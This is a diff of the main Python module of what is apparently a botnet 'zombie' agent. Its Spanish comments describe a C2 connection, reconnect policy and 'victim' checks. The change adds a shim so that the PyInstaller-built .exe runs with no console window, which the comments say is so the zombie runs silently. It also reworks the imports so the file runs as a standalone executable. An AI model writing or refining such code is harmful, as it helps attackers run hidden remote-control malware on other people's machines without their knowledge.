@@ -6,8 +6,38 @@ mientras el C2 no esté disponible. Termina con stop/bye/auth o Ctrl+C.
 
 Con `--menu` se abre el menú de diagnóstico local (ping, info, heartbeat,
 verificación de la víctima y conexión manual al C2).
+
+El .exe se compila SIN consola (PyInstaller console=False): el shim de abajo
+instala flujos nulos cuando sys.stdout/sys.stdin son None, para que el zombie
+corra en silencio y no quede ninguna ventana pegada en pantalla.
 """
 from __future__ import annotations
+
+import sys
+
+if sys.stdout is None or sys.stderr is None or sys.stdin is None:
+
+    class _NullStream:
+        """Flujo de descarte para ejecución windowless (sin consola)."""
+
+        def write(self, *args, **kwargs):
+            pass
+
+        def flush(self, *args, **kwargs):
+            pass
+
+        def readline(self, *args, **kwargs):
+            return ""
+
+        def isatty(self):
+            return False
+
+    if sys.stdout is None:
+        sys.stdout = _NullStream()
+    if sys.stderr is None:
+        sys.stderr = _NullStream()
+    if sys.stdin is None:
+        sys.stdin = _NullStream()
 
 import asyncio
 import json
@@ -16,13 +46,19 @@ import time
 import urllib.error
 import urllib.request
 import uuid
+from pathlib import Path
 
-from . import config
-from .c2_client import EXIT_RETRY, connect_c2
-from .commands import handle_command
-from .identity import build_hello, build_heartbeat
-from .protocol import decode_message, encode_message
-from .reconnect_policy import reconnect_decision
+# Los módulos del agente usan imports directos; este archivo se ejecuta como
+# script suelto (PyInstaller) o como `python -m src.main`, así que el
+# directorio de src se agrega explícitamente para que ambos casos funcionen.
+sys.path.insert(0, str(Path(__file__).resolve().parent))
+
+import config
+from c2_client import EXIT_RETRY, connect_c2
+from commands import handle_command
+from identity import build_hello, build_heartbeat
+from protocol import decode_message, encode_message
+from reconnect_policy import reconnect_decision
 
 
 def mostrar(mensaje):
